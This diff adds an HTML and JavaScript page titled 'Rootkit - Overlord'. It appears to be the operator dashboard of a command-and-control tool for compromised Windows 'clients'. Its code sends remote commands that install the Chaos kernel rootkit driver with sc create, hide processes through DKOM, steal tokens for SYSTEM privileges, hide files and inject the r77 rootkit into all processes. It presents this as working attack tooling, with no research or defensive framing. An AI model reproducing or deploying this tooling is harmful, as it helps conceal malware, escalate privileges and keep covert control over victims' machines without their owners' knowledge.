@@ -1,0 +1,517 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Rootkit - Overlord</title>
+    <link rel="icon" type="image/x-icon" href="/assets/favicon.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="/assets/tailwind.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="https://cdn.jsdelivr.net/npm/msgpackr@1.11.8/dist/index.js"></script>
+    <link rel="stylesheet" href="/assets/main.css" />
+    <script src="/assets/toast.js"></script>
+    <script src="/assets/ripple.js"></script>
+  </head>
+  <body class="min-h-screen bg-slate-950 text-slate-100">
+    <header id="top-nav"></header>
+
+    <main class="px-5 py-6">
+      <div class="max-w-7xl mx-auto flex flex-col gap-6">
+
+        <!-- Page header -->
+        <div class="flex flex-wrap items-start justify-between gap-4">
+          <div>
+            <h1 class="text-2xl font-semibold flex items-center gap-2">
+              <i class="fa-solid fa-skull text-red-400"></i> Rootkit
+            </h1>
+            <p class="text-slate-400 mt-1">Manage rootkitted clients — Chaos (ring0 + ring3) and r77 (ring3)</p>
+          </div>
+          <div class="flex items-center gap-2">
+            <button id="refresh-btn" class="inline-flex items-center gap-2 px-3 py-2 rounded-lg bg-slate-800 border border-slate-700 hover:bg-slate-700 text-sm transition-colors">
+              <i class="fa-solid fa-rotate-right text-slate-400"></i> Refresh
+            </button>
+          </div>
+        </div>
+
+        <!-- Tabs -->
+        <div class="flex gap-1 border-b border-slate-800">
+          <button data-tab="clients" class="tab-btn active-tab px-4 py-2 text-sm font-medium text-slate-200 border-b-2 border-red-500 -mb-px transition-colors">
+            <i class="fa-solid fa-display mr-1.5"></i> Clients
+          </button>
+          <button data-tab="chaos" class="tab-btn px-4 py-2 text-sm font-medium text-slate-400 border-b-2 border-transparent -mb-px hover:text-slate-200 transition-colors">
+            <i class="fa-solid fa-skull mr-1.5"></i> Chaos Operations
+          </button>
+          <button data-tab="r77" class="tab-btn px-4 py-2 text-sm font-medium text-slate-400 border-b-2 border-transparent -mb-px hover:text-slate-200 transition-colors">
+            <i class="fa-solid fa-ghost mr-1.5"></i> r77 Operations
+          </button>
+        </div>
+
+        <!-- Clients Tab -->
+        <div id="tab-clients" class="tab-content">
+          <div class="flex flex-wrap items-center justify-between gap-3 mb-4">
+            <p class="text-sm text-slate-400">Click a client to toggle rootkit status. Rootkit state is tracked locally in your browser.</p>
+            <div class="flex items-center gap-2 text-xs text-slate-500">
+              <span class="flex items-center gap-1"><span class="w-2 h-2 rounded-full bg-red-500 inline-block"></span> Chaos active</span>
+              <span class="flex items-center gap-1"><span class="w-2 h-2 rounded-full bg-rose-400 inline-block"></span> r77 active</span>
+              <span class="flex items-center gap-1"><span class="w-2 h-2 rounded-full bg-slate-600 inline-block"></span> No rootkit</span>
+            </div>
+          </div>
+
+          <div id="clients-loading" class="text-sm text-slate-500 flex items-center gap-2 py-8 justify-center">
+            <i class="fa-solid fa-spinner fa-spin"></i> Loading clients...
+          </div>
+          <div id="clients-empty" class="hidden text-sm text-slate-500 text-center py-8">No clients connected.</div>
+          <div id="clients-grid" class="hidden grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3"></div>
+        </div>
+
+        <!-- Chaos Operations Tab -->
+        <div id="tab-chaos" class="tab-content hidden">
+          <div class="flex flex-col gap-4">
+            <div class="p-3 bg-red-900/20 border border-red-700/40 rounded-lg text-xs text-red-300 flex items-start gap-2">
+              <i class="fa-solid fa-triangle-exclamation mt-0.5"></i>
+              <span>Chaos rootkit requires the agent to have <code>Chaos-Rootkit.sys</code> and/or the ring3 controller bundled. Ring0 operations require Administrator / SYSTEM privileges.</span>
+            </div>
+
+            <!-- Target client selector -->
+            <div>
+              <label class="block text-sm font-medium text-slate-300 mb-2">Target Client</label>
+              <select id="chaos-target" class="w-full max-w-xs px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-red-500 transition-colors">
+                <option value="">Select a client...</option>
+              </select>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <!-- Ring 0 Operations -->
+              <div class="bg-slate-900/60 border border-red-800/40 rounded-xl p-4">
+                <h3 class="text-sm font-semibold text-red-300 mb-3 flex items-center gap-2">
+                  <span class="text-xs bg-red-900/50 text-red-300 px-1.5 py-0.5 rounded border border-red-700/50">Ring 0</span>
+                  Kernel Driver
+                </h3>
+                <div class="flex flex-col gap-2">
+                  <button class="chaos-cmd w-full text-left px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm hover:border-red-600 transition-colors"
+                    data-cmd="load-driver">
+                    <i class="fa-solid fa-play text-red-400 mr-2"></i> Load Kernel Driver
+                    <span class="text-xs text-slate-500 block ml-6">Install and start Chaos-Rootkit.sys</span>
+                  </button>
+                  <button class="chaos-cmd w-full text-left px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm hover:border-red-600 transition-colors"
+                    data-cmd="unload-driver">
+                    <i class="fa-solid fa-stop text-slate-400 mr-2"></i> Unload Kernel Driver
+                    <span class="text-xs text-slate-500 block ml-6">Stop and remove Chaos-Rootkit.sys</span>
+                  </button>
+                  <button class="chaos-cmd w-full text-left px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm hover:border-red-600 transition-colors"
+                    data-cmd="hide-process">
+                    <i class="fa-solid fa-eye-slash text-red-400 mr-2"></i> Hide Process (DKOM)
+                    <span class="text-xs text-slate-500 block ml-6">Hide by PID via kernel DKOM</span>
+                  </button>
+                  <button class="chaos-cmd w-full text-left px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm hover:border-red-600 transition-colors"
+                    data-cmd="elevate">
+                    <i class="fa-solid fa-arrow-up text-yellow-400 mr-2"></i> Elevate Privileges
+                    <span class="text-xs text-slate-500 block ml-6">Token steal → SYSTEM via driver</span>
+                  </button>
+                </div>
+              </div>
+
+              <!-- Ring 3 Operations -->
+              <div class="bg-slate-900/60 border border-rose-800/40 rounded-xl p-4">
+                <h3 class="text-sm font-semibold text-rose-300 mb-3 flex items-center gap-2">
+                  <span class="text-xs bg-rose-900/50 text-rose-300 px-1.5 py-0.5 rounded border border-rose-700/50">Ring 3</span>
+                  Controller
+                </h3>
+                <div class="flex flex-col gap-2">
+                  <button class="chaos-cmd w-full text-left px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm hover:border-rose-600 transition-colors"
+                    data-cmd="start-console">
+                    <i class="fa-solid fa-terminal text-rose-400 mr-2"></i> Start Console Controller
+                    <span class="text-xs text-slate-500 block ml-6">Launch ring3-console.exe</span>
+                  </button>
+                  <button class="chaos-cmd w-full text-left px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm hover:border-rose-600 transition-colors"
+                    data-cmd="start-gui">
+                    <i class="fa-solid fa-window-restore text-rose-400 mr-2"></i> Start GUI Controller
+                    <span class="text-xs text-slate-500 block ml-6">Launch ring3-gui.exe (requires HVNC/desktop)</span>
+                  </button>
+                  <button class="chaos-cmd w-full text-left px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm hover:border-rose-600 transition-colors"
+                    data-cmd="hide-file">
+                    <i class="fa-solid fa-file-circle-minus text-rose-400 mr-2"></i> Hide File / Directory
+                    <span class="text-xs text-slate-500 block ml-6">Send hide command to ring3 controller</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Command output -->
+            <div>
+              <label class="block text-xs font-medium text-slate-400 mb-1">Command Output</label>
+              <div id="chaos-output" class="min-h-[80px] font-mono text-xs bg-slate-900 border border-slate-700 rounded-lg p-3 text-slate-300 whitespace-pre-wrap">Select a client and click an operation above.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- r77 Operations Tab -->
+        <div id="tab-r77" class="tab-content hidden">
+          <div class="flex flex-col gap-4">
+            <div class="p-3 bg-rose-900/20 border border-rose-700/40 rounded-lg text-xs text-rose-300 flex items-start gap-2">
+              <i class="fa-solid fa-ghost mt-0.5"></i>
+              <span>r77 is a fileless ring-3 rootkit. It hooks Windows APIs to hide files, processes, registry keys, and network connections matching the prefix <code>$77</code>. No admin required.</span>
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium text-slate-300 mb-2">Target Client</label>
+              <select id="r77-target" class="w-full max-w-xs px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-rose-500 transition-colors">
+                <option value="">Select a client...</option>
+              </select>
+            </div>
+
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+              <button class="r77-cmd text-left px-4 py-3 bg-slate-800/60 border border-slate-700 rounded-xl hover:border-rose-500 transition-colors"
+                data-cmd="install">
+                <i class="fa-solid fa-play text-rose-400 mr-2"></i>
+                <span class="text-sm font-medium">Install r77</span>
+                <p class="text-xs text-slate-500 mt-0.5 ml-6">Run Install.exe — inject rootkit into all processes</p>
+              </button>
+              <button class="r77-cmd text-left px-4 py-3 bg-slate-800/60 border border-slate-700 rounded-xl hover:border-slate-500 transition-colors"
+                data-cmd="uninstall">
+                <i class="fa-solid fa-stop text-slate-400 mr-2"></i>
+                <span class="text-sm font-medium">Uninstall r77</span>
+                <p class="text-xs text-slate-500 mt-0.5 ml-6">Run Uninstall.exe — remove rootkit from all processes</p>
+              </button>
+              <button class="r77-cmd text-left px-4 py-3 bg-slate-800/60 border border-slate-700 rounded-xl hover:border-rose-500 transition-colors"
+                data-cmd="hide-process-name">
+                <i class="fa-solid fa-eye-slash text-rose-400 mr-2"></i>
+                <span class="text-sm font-medium">Hide by name prefix</span>
+                <p class="text-xs text-slate-500 mt-0.5 ml-6">Rename process/file to <code>$77...</code> to hide it</p>
+              </button>
+              <button class="r77-cmd text-left px-4 py-3 bg-slate-800/60 border border-slate-700 rounded-xl hover:border-rose-500 transition-colors"
+                data-cmd="inject-shellcode">
+                <i class="fa-solid fa-syringe text-rose-400 mr-2"></i>
+                <span class="text-sm font-medium">Inject Shellcode</span>
+                <p class="text-xs text-slate-500 mt-0.5 ml-6">Use Install.shellcode for reflective injection</p>
+              </button>
+            </div>
+
+            <div>
+              <label class="block text-xs font-medium text-slate-400 mb-1">Command Output</label>
+              <div id="r77-output" class="min-h-[80px] font-mono text-xs bg-slate-900 border border-slate-700 rounded-lg p-3 text-slate-300 whitespace-pre-wrap">Select a client and click an operation above.</div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </main>
+
+    <!-- Command modal -->
+    <div id="cmd-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm">
+      <div class="bg-slate-900 border border-slate-700 rounded-xl p-6 w-full max-w-md mx-4 flex flex-col gap-4">
+        <h3 id="modal-title" class="text-base font-semibold"></h3>
+        <div id="modal-fields" class="flex flex-col gap-3"></div>
+        <div id="modal-preview" class="hidden">
+          <label class="block text-xs font-medium text-slate-400 mb-1">Command preview</label>
+          <pre id="modal-preview-code" class="text-xs font-mono bg-slate-800 border border-slate-700 rounded-lg p-2 text-slate-300 whitespace-pre-wrap"></pre>
+        </div>
+        <div class="flex gap-2 justify-end">
+          <button id="modal-cancel" class="px-4 py-2 text-sm bg-slate-800 hover:bg-slate-700 rounded-lg border border-slate-700 transition-colors">Cancel</button>
+          <button id="modal-confirm" class="px-4 py-2 text-sm bg-red-700 hover:bg-red-600 text-white rounded-lg font-medium transition-colors">Send Command</button>
+        </div>
+      </div>
+    </div>
+
+    <script type="module">
+      import { mountNav } from "/assets/nav/template.js";
+      import { applyUserRoleUI } from "/assets/nav/role-ui.js";
+      import { initNav } from "/assets/nav/nav.js";
+
+      const navRefs = mountNav(document.getElementById("top-nav"));
+      initNav(navRefs);
+
+      // Rootkit state: { clientId: { chaos: bool, r77: bool } }
+      const STORAGE_KEY = "overlord_rootkit_state";
+      function getRkState() {
+        try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}"); } catch { return {}; }
+      }
+      function setRkState(s) { localStorage.setItem(STORAGE_KEY, JSON.stringify(s)); }
+      function toggleRk(clientId, type) {
+        const s = getRkState();
+        if (!s[clientId]) s[clientId] = {};
+        s[clientId][type] = !s[clientId][type];
+        setRkState(s);
+        return s[clientId][type];
+      }
+
+      let allClients = [];
+
+      function osIcon(os) {
+        if (!os) return "fa-display";
+        const o = os.toLowerCase();
+        if (o.includes("windows")) return "fa-brands fa-windows";
+        if (o.includes("linux")) return "fa-brands fa-linux";
+        if (o.includes("darwin") || o.includes("mac")) return "fa-brands fa-apple";
+        return "fa-display";
+      }
+
+      function renderClients() {
+        const grid = document.getElementById("clients-grid");
+        const state = getRkState();
+        grid.innerHTML = "";
+        for (const c of allClients) {
+          const rk = state[c.id] || {};
+          const hasChaos = !!rk.chaos;
+          const hasR77 = !!rk.r77;
+          const isOnline = c.online;
+          const div = document.createElement("div");
+          div.className = "bg-slate-900/60 border border-slate-800 rounded-xl p-4 flex flex-col gap-3 hover:border-slate-600 transition-colors";
+          div.innerHTML = `
+            <div class="flex items-start justify-between gap-2">
+              <div class="flex items-center gap-2 min-w-0">
+                <i class="fa-solid ${osIcon(c.os)} text-slate-400 shrink-0"></i>
+                <div class="min-w-0">
+                  <p class="text-sm font-medium truncate">${c.host || c.id}</p>
+                  <p class="text-xs text-slate-500 truncate">${c.user || ""}</p>
+                </div>
+              </div>
+              <span class="shrink-0 text-xs px-1.5 py-0.5 rounded-full ${isOnline ? "bg-emerald-900/50 text-emerald-300 border border-emerald-700/50" : "bg-slate-800 text-slate-500 border border-slate-700"}">
+                ${isOnline ? "online" : "offline"}
+              </span>
+            </div>
+            <div class="flex gap-1.5 flex-wrap">
+              <button class="toggle-chaos flex items-center gap-1.5 text-xs px-2 py-1 rounded border transition-colors ${hasChaos ? "bg-red-900/50 border-red-700/50 text-red-300" : "bg-slate-800 border-slate-700 text-slate-400 hover:border-red-700"}"
+                data-client="${c.id}">
+                <i class="fa-solid fa-skull text-xs"></i> Chaos ${hasChaos ? "ON" : "OFF"}
+              </button>
+              <button class="toggle-r77 flex items-center gap-1.5 text-xs px-2 py-1 rounded border transition-colors ${hasR77 ? "bg-rose-900/50 border-rose-700/50 text-rose-300" : "bg-slate-800 border-slate-700 text-slate-400 hover:border-rose-700"}"
+                data-client="${c.id}">
+                <i class="fa-solid fa-ghost text-xs"></i> r77 ${hasR77 ? "ON" : "OFF"}
+              </button>
+            </div>
+            <div class="flex gap-1.5">
+              <a href="/${c.id}/console" target="_blank"
+                class="flex-1 text-center text-xs px-2 py-1.5 bg-slate-800 border border-slate-700 rounded hover:border-slate-500 transition-colors">
+                <i class="fa-solid fa-terminal mr-1"></i> Console
+              </a>
+              <a href="/${c.id}/files" target="_blank"
+                class="flex-1 text-center text-xs px-2 py-1.5 bg-slate-800 border border-slate-700 rounded hover:border-slate-500 transition-colors">
+                <i class="fa-solid fa-folder mr-1"></i> Files
+              </a>
+            </div>`;
+          div.querySelector(".toggle-chaos").addEventListener("click", (e) => {
+            const cid = e.currentTarget.dataset.client;
+            toggleRk(cid, "chaos");
+            renderClients();
+          });
+          div.querySelector(".toggle-r77").addEventListener("click", (e) => {
+            const cid = e.currentTarget.dataset.client;
+            toggleRk(cid, "r77");
+            renderClients();
+          });
+          grid.appendChild(div);
+        }
+      }
+
+      function populateTargetSelects() {
+        for (const selId of ["chaos-target", "r77-target"]) {
+          const sel = document.getElementById(selId);
+          const current = sel.value;
+          sel.innerHTML = '<option value="">Select a client...</option>';
+          for (const c of allClients) {
+            const opt = document.createElement("option");
+            opt.value = c.id;
+            opt.textContent = `${c.host || c.id} (${c.online ? "online" : "offline"})`;
+            sel.appendChild(opt);
+          }
+          if (current) sel.value = current;
+        }
+      }
+
+      async function loadClients() {
+        document.getElementById("clients-loading").classList.remove("hidden");
+        document.getElementById("clients-empty").classList.add("hidden");
+        document.getElementById("clients-grid").classList.add("hidden");
+        try {
+          const res = await fetch("/api/clients", { credentials: "include" });
+          if (!res.ok) { document.getElementById("clients-loading").classList.add("hidden"); return; }
+          const data = await res.json();
+          allClients = data.clients || [];
+          document.getElementById("clients-loading").classList.add("hidden");
+          if (!allClients.length) {
+            document.getElementById("clients-empty").classList.remove("hidden");
+          } else {
+            renderClients();
+            populateTargetSelects();
+            document.getElementById("clients-grid").classList.remove("hidden");
+          }
+        } catch {
+          document.getElementById("clients-loading").classList.add("hidden");
+        }
+      }
+
+      // Tab switching
+      document.querySelectorAll(".tab-btn").forEach(btn => {
+        btn.addEventListener("click", () => {
+          document.querySelectorAll(".tab-btn").forEach(b => {
+            b.classList.remove("active-tab", "text-slate-200", "border-red-500");
+            b.classList.add("text-slate-400", "border-transparent");
+          });
+          btn.classList.add("active-tab", "text-slate-200", "border-red-500");
+          btn.classList.remove("text-slate-400", "border-transparent");
+          document.querySelectorAll(".tab-content").forEach(t => t.classList.add("hidden"));
+          document.getElementById(`tab-${btn.dataset.tab}`)?.classList.remove("hidden");
+        });
+      });
+
+      // Modal helpers
+      const modal = document.getElementById("cmd-modal");
+      const modalTitle = document.getElementById("modal-title");
+      const modalFields = document.getElementById("modal-fields");
+      const modalPreview = document.getElementById("modal-preview");
+      const modalPreviewCode = document.getElementById("modal-preview-code");
+
+      function showModal(title, fields, previewFn) {
+        modalTitle.textContent = title;
+        modalFields.innerHTML = "";
+        for (const f of fields) {
+          const wrap = document.createElement("div");
+          wrap.innerHTML = `<label class="block text-xs font-medium text-slate-400 mb-1">${f.label}</label>
+            <input id="modal-field-${f.id}" type="text" placeholder="${f.placeholder || ""}"
+              class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-red-500" />`;
+          modalFields.appendChild(wrap);
+        }
+        if (previewFn) {
+          modalPreview.classList.remove("hidden");
+          const updatePreview = () => {
+            const vals = {};
+            for (const f of fields) vals[f.id] = document.getElementById(`modal-field-${f.id}`)?.value || "";
+            modalPreviewCode.textContent = previewFn(vals);
+          };
+          modalFields.querySelectorAll("input").forEach(i => i.addEventListener("input", updatePreview));
+          updatePreview();
+        } else {
+          modalPreview.classList.add("hidden");
+        }
+        modal.classList.remove("hidden");
+        return new Promise((resolve) => {
+          document.getElementById("modal-confirm").onclick = () => {
+            const vals = {};
+            for (const f of fields) vals[f.id] = document.getElementById(`modal-field-${f.id}`)?.value || "";
+            modal.classList.add("hidden");
+            resolve(vals);
+          };
+          document.getElementById("modal-cancel").onclick = () => {
+            modal.classList.add("hidden");
+            resolve(null);
+          };
+        });
+      }
+
+      async function sendCommand(clientId, command) {
+        const out = document.getElementById("chaos-output") || document.getElementById("r77-output");
+        if (!clientId) { if (out) out.textContent = "Error: no client selected."; return; }
+        try {
+          const res = await fetch(`/api/clients/${clientId}/exec`, {
+            method: "POST",
+            credentials: "include",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ command, timeout: 30 }),
+          });
+          const text = await res.text();
+          if (out) out.textContent = text;
+        } catch (e) {
+          if (out) out.textContent = `Error: ${e.message}`;
+        }
+      }
+
+      // Chaos command handlers
+      const chaosCommands = {
+        "load-driver": async (clientId) => {
+          const cmd = `sc create ChaosRootkit binPath= "C:\\Windows\\Temp\\Chaos-Rootkit.sys" type= kernel && sc start ChaosRootkit`;
+          document.getElementById("chaos-output").textContent = `[cmd] ${cmd}\nSending...`;
+          await sendCommand(clientId, cmd);
+        },
+        "unload-driver": async (clientId) => {
+          const cmd = `sc stop ChaosRootkit && sc delete ChaosRootkit`;
+          document.getElementById("chaos-output").textContent = `[cmd] ${cmd}\nSending...`;
+          await sendCommand(clientId, cmd);
+        },
+        "hide-process": async (clientId) => {
+          const vals = await showModal("Hide Process (DKOM)", [
+            { id: "pid", label: "Process ID (PID)", placeholder: "1234" }
+          ], (v) => `ring3-console.exe hide-pid ${v.pid}`);
+          if (!vals) return;
+          const cmd = `ring3-console.exe hide-pid ${vals.pid}`;
+          document.getElementById("chaos-output").textContent = `[cmd] ${cmd}\nSending...`;
+          await sendCommand(clientId, cmd);
+        },
+        "elevate": async (clientId) => {
+          const cmd = `ring3-console.exe elevate`;
+          document.getElementById("chaos-output").textContent = `[cmd] ${cmd}\nSending...`;
+          await sendCommand(clientId, cmd);
+        },
+        "start-console": async (clientId) => {
+          const cmd = `start /B ring3-console.exe`;
+          document.getElementById("chaos-output").textContent = `[cmd] ${cmd}\nSending...`;
+          await sendCommand(clientId, cmd);
+        },
+        "start-gui": async (clientId) => {
+          const cmd = `start ring3-gui.exe`;
+          document.getElementById("chaos-output").textContent = `[cmd] ${cmd}\nSending...`;
+          await sendCommand(clientId, cmd);
+        },
+        "hide-file": async (clientId) => {
+          const vals = await showModal("Hide File / Directory", [
+            { id: "path", label: "Full path to hide", placeholder: "C:\\Windows\\Temp\\payload.exe" }
+          ], (v) => `ring3-console.exe hide-path "${v.path}"`);
+          if (!vals) return;
+          const cmd = `ring3-console.exe hide-path "${vals.path}"`;
+          document.getElementById("chaos-output").textContent = `[cmd] ${cmd}\nSending...`;
+          await sendCommand(clientId, cmd);
+        },
+      };
+
+      document.querySelectorAll(".chaos-cmd").forEach(btn => {
+        btn.addEventListener("click", () => {
+          const clientId = document.getElementById("chaos-target").value;
+          if (!clientId) { document.getElementById("chaos-output").textContent = "Select a target client first."; return; }
+          const handler = chaosCommands[btn.dataset.cmd];
+          if (handler) handler(clientId);
+        });
+      });
+
+      // r77 command handlers
+      const r77Commands = {
+        "install": async (clientId) => {
+          const cmd = `C:\\Windows\\Temp\\r77-Install.exe`;
+          document.getElementById("r77-output").textContent = `[cmd] ${cmd}\nSending...`;
+          await sendCommand(clientId, cmd);
+        },
+        "uninstall": async (clientId) => {
+          const cmd = `C:\\Windows\\Temp\\r77-Uninstall.exe`;
+          document.getElementById("r77-output").textContent = `[cmd] ${cmd}\nSending...`;
+          await sendCommand(clientId, cmd);
+        },
+        "hide-process-name": async (clientId) => {
+          const vals = await showModal("Rename to hide", [
+            { id: "name", label: "Process or file name to rename", placeholder: "myprocess.exe" }
+          ], (v) => `ren "${v.name}" "$77${v.name}"`);
+          if (!vals) return;
+          const cmd = `ren "${vals.name}" "$77${vals.name}"`;
+          document.getElementById("r77-output").textContent = `[cmd] ${cmd}\nSending...`;
+          await sendCommand(clientId, cmd);
+        },
+        "inject-shellcode": async (clientId) => {
+          document.getElementById("r77-output").textContent = "To use Install.shellcode for reflective injection, load it via your loader of choice (e.g. donut, custom loader). No automatic injection available — use the Files tab to upload and the Console tab to execute.";
+        },
+      };
+
+      document.querySelectorAll(".r77-cmd").forEach(btn => {
+        btn.addEventListener("click", () => {
+          const clientId = document.getElementById("r77-target").value;
+          if (!clientId) { document.getElementById("r77-output").textContent = "Select a target client first."; return; }
+          const handler = r77Commands[btn.dataset.cmd];
+          if (handler) handler(clientId);
+        });
+      });
+
+      document.getElementById("refresh-btn").addEventListener("click", loadClients);
+      loadClients();
+    </script>
+  </body>
+</html>
